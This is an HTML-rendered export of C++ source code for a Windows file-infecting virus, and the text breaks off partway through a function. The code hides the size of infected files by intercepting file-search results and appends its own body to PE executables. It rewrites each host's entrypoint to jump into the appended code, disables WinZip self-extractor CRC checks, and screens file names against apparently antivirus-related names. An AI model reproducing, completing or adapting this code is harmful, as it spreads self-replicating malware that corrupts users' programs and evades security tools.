<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>body.cpp</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
.sc19 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">//#define MAGICPID  1848
</span><span class="sc0">
</span><span class="sc9">#define TESTVALUECHANGEME   666 </span><span class="sc2">//please change the code where i am used
</span><span class="sc0">
</span><span class="sc9">#define VIRTUALSIZE         0x4000
#define VIRTUALCODESIZE     0x3000
#define RAWSIZEALIGN        0x2000
</span><span class="sc0">
</span><span class="sc9">#include "inc\cpp.hpp"
</span><span class="sc0">
</span><span class="sc2">//todo: cd protection, network, anti av monitor
</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc6">"C"</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

</span><span class="sc1">/* stealths with finddata's intercepted from the two find-api hooks */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">finddatastealth</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">base</span><span class="sc10">,</span><span class="sc11">WIN32_FIND_DATA</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">wfd</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">hookglob</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">hg</span><span class="sc10">=(</span><span class="sc11">hookglob</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">base</span><span class="sc10">+</span><span class="sc11">VIRTUALCODESIZE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">=(</span><span class="sc11">api</span><span class="sc10">*)&amp;</span><span class="sc11">hg</span><span class="sc10">-&gt;</span><span class="sc11">a</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!(</span><span class="sc11">hg</span><span class="sc10">-&gt;</span><span class="sc11">flags</span><span class="sc10">&amp;</span><span class="sc11">STEALTH_SIZE</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">wfd</span><span class="sc10">-&gt;</span><span class="sc11">dwFileAttributes</span><span class="sc10">&amp;</span><span class="sc11">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">//quick check filetime. 0=not processed, 1=infected, 2=processed,not infected
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">isspecialfiletime</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">,&amp;</span><span class="sc11">wfd</span><span class="sc10">-&gt;</span><span class="sc11">ftLastWriteTime</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">//check if it was really infectable
</span><span class="sc0">    </span><span class="sc2">//if (!isgoodname(base,a,wfd-&gt;cFileName)) return;
</span><span class="sc0">
    </span><span class="sc2">//and finally stealth
//    wfd-&gt;nFileSizeLow-=RAWSIZEALIGN;
</span><span class="sc0">    </span><span class="sc11">wfd</span><span class="sc10">-&gt;</span><span class="sc11">nFileSizeLow</span><span class="sc10">=</span><span class="sc4">123</span><span class="sc10">;</span><span class="sc2">//RAWSIZEALIGN;
</span><span class="sc10">}</span><span class="sc0">




</span><span class="sc1">/* infects filename (the largest and least optimized routine from this app) */</span><span class="sc0">   
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">infect</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">base</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">FILEIO</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">MZ_HEADER</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">mz</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PE_HEADER</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">pe</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">iswzip</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc16">asm</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc0">

    </span><span class="sc11">mz</span><span class="sc10">=(</span><span class="sc11">MZ_HEADER</span><span class="sc10">*)</span><span class="sc11">openfile</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">,&amp;</span><span class="sc11">f</span><span class="sc10">,</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc11">RAWSIZEALIGN</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">mz</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc1">/* 
 ..."If the word value at offset 18h is 40h or greater, the word value at 3Ch
 is typically an offset to a Windows header. Applications must verify this for
 each executable-file header being tested, because a few applications have
 a different header style."...                                              */</span><span class="sc0">

    </span><span class="sc16">double</span><span class="sc0"> </span><span class="sc11">cloak</span><span class="sc10">=(</span><span class="sc16">double</span><span class="sc10">)</span><span class="sc11">IMAGE_DOS_SIGNATURE</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">//avoid strange files
</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">double</span><span class="sc10">)</span><span class="sc11">mz</span><span class="sc10">-&gt;</span><span class="sc11">mz_id</span><span class="sc10">!=</span><span class="sc11">cloak</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">//cloaked MZ sign
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mz</span><span class="sc10">-&gt;</span><span class="sc11">mz_relofs</span><span class="sc10">&lt;</span><span class="sc4">0x40</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mz</span><span class="sc10">-&gt;</span><span class="sc11">mz_neptr</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">.</span><span class="sc19">size</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">pe</span><span class="sc10">=(</span><span class="sc11">PE_HEADER</span><span class="sc10">*)(((</span><span class="sc11">MZ_HEADER</span><span class="sc10">*)</span><span class="sc11">mz</span><span class="sc10">)-&gt;</span><span class="sc11">mz_neptr</span><span class="sc10">+(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">mz</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">cloak</span><span class="sc10">=(</span><span class="sc16">double</span><span class="sc10">)</span><span class="sc11">IMAGE_NT_SIGNATURE</span><span class="sc10">;</span><span class="sc0">       </span><span class="sc2">//cloaked PE sign
</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">double</span><span class="sc10">)</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_id</span><span class="sc10">!=</span><span class="sc11">cloak</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_objectalign</span><span class="sc10">!=</span><span class="sc4">0x1000</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_cputype</span><span class="sc10">!=</span><span class="sc11">IMAGE_FILE_MACHINE_I386</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_securityrva</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!(</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_flags</span><span class="sc10">&amp;</span><span class="sc11">IMAGE_FILE_32BIT_MACHINE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc10">!(</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_flags</span><span class="sc10">&amp;</span><span class="sc11">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
         </span><span class="sc10">(</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_flags</span><span class="sc10">&amp;</span><span class="sc11">IMAGE_FILE_DLL</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_ntheadersize</span><span class="sc10">==</span><span class="sc4">224</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">PE_OBJENTRY_STRUCT</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">pos</span><span class="sc10">=(</span><span class="sc11">PE_OBJENTRY_STRUCT</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">pe</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">PE_HEADER</span><span class="sc10">));</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pos</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">].</span><span class="sc11">oe_objectflags</span><span class="sc10">&amp;</span><span class="sc11">IMAGE_SCN_MEM_WRITE</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
            </span><span class="sc11">pos</span><span class="sc10">[</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_numofobjects</span><span class="sc10">].</span><span class="sc11">oe_objectflags</span><span class="sc10">&amp;</span><span class="sc11">IMAGE_SCN_MEM_WRITE</span><span class="sc10">)</span><span class="sc0">
          </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">maxraw</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">maxi</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_numofobjects</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">crc32</span><span class="sc10">(</span><span class="sc11">pos</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">oe_name</span><span class="sc10">)==</span><span class="sc4">0xa66d28e3</span><span class="sc10">)</span><span class="sc0">  </span><span class="sc2">//is _winzip_ ?
</span><span class="sc0">              </span><span class="sc11">iswzip</span><span class="sc10">++;</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pos</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">oe_physoffs</span><span class="sc10">&gt;</span><span class="sc11">maxraw</span><span class="sc10">)</span><span class="sc0">  </span><span class="sc2">//if highest raw, remember 'm
</span><span class="sc0">            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">maxraw</span><span class="sc10">=</span><span class="sc11">pos</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">oe_physoffs</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">maxi</span><span class="sc10">=</span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">maxraw</span><span class="sc10">+</span><span class="sc11">pos</span><span class="sc10">[</span><span class="sc11">maxi</span><span class="sc10">].</span><span class="sc11">oe_physsize</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">.</span><span class="sc19">size</span><span class="sc10">)</span><span class="sc0">
          </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">//overlays?
</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">bestsize</span><span class="sc10">=</span><span class="sc11">pos</span><span class="sc10">[</span><span class="sc11">maxi</span><span class="sc10">].</span><span class="sc11">oe_physsize</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">maxraw</span><span class="sc10">+=</span><span class="sc11">bestsize</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc11">pos</span><span class="sc10">[</span><span class="sc11">maxi</span><span class="sc10">].</span><span class="sc11">oe_physsize</span><span class="sc10">+=</span><span class="sc11">RAWSIZEALIGN</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">pos</span><span class="sc10">[</span><span class="sc11">maxi</span><span class="sc10">].</span><span class="sc11">oe_virtsize</span><span class="sc10">+=</span><span class="sc11">RAWSIZEALIGN</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_imagesize</span><span class="sc10">+=</span><span class="sc11">RAWSIZEALIGN</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pos</span><span class="sc10">[</span><span class="sc11">maxi</span><span class="sc10">].</span><span class="sc11">oe_virtsize</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">pos</span><span class="sc10">[</span><span class="sc11">maxi</span><span class="sc10">].</span><span class="sc11">oe_physsize</span><span class="sc10">)</span><span class="sc0">
          </span><span class="sc11">pos</span><span class="sc10">[</span><span class="sc11">maxi</span><span class="sc10">].</span><span class="sc11">oe_virtsize</span><span class="sc10">=</span><span class="sc11">pos</span><span class="sc10">[</span><span class="sc11">maxi</span><span class="sc10">].</span><span class="sc11">oe_physsize</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">entryraw</span><span class="sc10">=</span><span class="sc11">rva2raw</span><span class="sc10">(</span><span class="sc11">mz</span><span class="sc10">,</span><span class="sc11">pe</span><span class="sc10">,</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_entrypointrva</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">entryraw</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc10">*(</span><span class="sc16">int</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)&amp;</span><span class="sc11">hostentryrva</span><span class="sc10">+(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">base</span><span class="sc10">-</span><span class="sc4">0x401000</span><span class="sc10">)=</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_entrypointrva</span><span class="sc10">+</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_imagebase</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc2">//backup some bytes from host's entrypoint
</span><span class="sc0">        </span><span class="sc11">memcpy</span><span class="sc10">((</span><span class="sc16">void</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">base</span><span class="sc10">+(</span><span class="sc16">int</span><span class="sc10">)&amp;</span><span class="sc11">org9entry</span><span class="sc10">-</span><span class="sc4">0x401000</span><span class="sc10">),(</span><span class="sc16">void</span><span class="sc10">*)</span><span class="sc11">entryraw</span><span class="sc10">,</span><span class="sc4">9</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc2">//copy virus
</span><span class="sc0">        </span><span class="sc11">memcpy</span><span class="sc10">((</span><span class="sc16">void</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">maxraw</span><span class="sc10">+(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">mz</span><span class="sc10">),</span><span class="sc11">base</span><span class="sc10">,</span><span class="sc11">RAWSIZEALIGN</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc2">//patch host's entrypoint
</span><span class="sc0">        </span><span class="sc10">*(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">entryraw</span><span class="sc10">=</span><span class="sc4">0xb8</span><span class="sc10">;</span><span class="sc0">                   </span><span class="sc2">//mov eax,
</span><span class="sc0">        </span><span class="sc10">*(</span><span class="sc16">int</span><span class="sc10">*)((</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">entryraw</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">)=-(</span><span class="sc11">bestsize</span><span class="sc10">+</span><span class="sc11">pos</span><span class="sc10">[</span><span class="sc11">maxi</span><span class="sc10">].</span><span class="sc11">oe_virtrva</span><span class="sc10">+</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_imagebase</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">*(</span><span class="sc16">int</span><span class="sc10">*)((</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">entryraw</span><span class="sc10">+</span><span class="sc4">5</span><span class="sc10">)=</span><span class="sc4">0xc350d8f7</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">//-neg eax- -push eax- -ret-
</span><span class="sc0">
        </span><span class="sc2">//if wzip sfx, kill crc32
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">iswzip</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc19">size</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">mz</span><span class="sc10">)[</span><span class="sc11">i</span><span class="sc10">]==</span><span class="sc4">0x4e</span><span class="sc10">)</span><span class="sc0">     </span><span class="sc2">//start of wzip header NMC blabla
</span><span class="sc0">                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sum</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">w</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">w</span><span class="sc10">&lt;</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc11">w</span><span class="sc10">++)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">sum</span><span class="sc10">+=((</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">mz</span><span class="sc10">)[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc11">w</span><span class="sc10">];</span><span class="sc0">
                        </span><span class="sc11">sum</span><span class="sc10">=</span><span class="sc11">sum</span><span class="sc10">&lt;&lt;</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sum</span><span class="sc10">==</span><span class="sc4">0x91a4</span><span class="sc10">)</span><span class="sc0">        </span><span class="sc2">//should be the sum :)
</span><span class="sc0">
                    </span><span class="sc10">*(</span><span class="sc16">int</span><span class="sc10">*)&amp;(((</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">mz</span><span class="sc10">)[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">8</span><span class="sc10">])=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc11">closefile</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">,&amp;</span><span class="sc11">f</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc2">//dont restore filesize
</span><span class="sc0">    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">x</span><span class="sc10">:</span><span class="sc0">

    </span><span class="sc11">closefile</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">,&amp;</span><span class="sc11">f</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc2">//restore filesize
</span><span class="sc0">    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">




</span><span class="sc1">/* rva2raw */</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">rva2raw</span><span class="sc10">(</span><span class="sc11">MZ_HEADER</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">mz</span><span class="sc10">,</span><span class="sc11">PE_HEADER</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">pe</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">PE_OBJENTRY_STRUCT</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">pos</span><span class="sc10">=(</span><span class="sc11">PE_OBJENTRY_STRUCT</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">pe</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">PE_HEADER</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_numofobjects</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rva</span><span class="sc10">&gt;</span><span class="sc11">pos</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">oe_virtrva</span><span class="sc10">&amp;&amp;</span><span class="sc11">rva</span><span class="sc10">&lt;(</span><span class="sc11">pos</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">oe_virtrva</span><span class="sc10">+</span><span class="sc11">pos</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">oe_virtsize</span><span class="sc10">))</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">-</span><span class="sc11">pos</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">oe_virtrva</span><span class="sc10">+</span><span class="sc11">pos</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">oe_physoffs</span><span class="sc10">+(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">mz</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">




</span><span class="sc1">/* checks for .exe, .scr and a list of av names */</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">isgoodname</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">base</span><span class="sc10">,</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">blen</span><span class="sc10">=</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">WideCharToMultiByte</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">filename</span><span class="sc10">,-</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">blen</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">CharUpperA</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc2">//C..BLAA
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]!=</span><span class="sc7">'C'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]!=</span><span class="sc7">'B'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">]!=</span><span class="sc7">'L'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
